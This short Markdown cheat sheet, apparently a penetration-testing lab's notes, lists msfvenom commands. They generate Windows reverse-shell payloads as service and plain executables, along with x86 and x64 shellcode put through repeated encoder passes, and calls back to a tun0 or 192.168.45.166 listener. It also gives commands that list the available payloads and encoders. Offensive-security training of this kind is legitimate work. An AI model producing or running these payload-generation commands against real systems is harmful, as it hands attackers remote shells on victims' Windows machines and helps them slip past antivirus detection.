
## Creating Service .exe payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=5555 -f exe-service 
```

## Creating normal .exe payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o shell.exe
```
##### Encoded Shellcode (x86)

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f c
```

##### Encoded Shellcode (x64)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.166 LPORT=4444 -e x64/xor_dynamic -i 5 -f c
```

List all payloads

```
msfvenom -l payloads
```

List all encoders

```
msfvenom -l encoders
```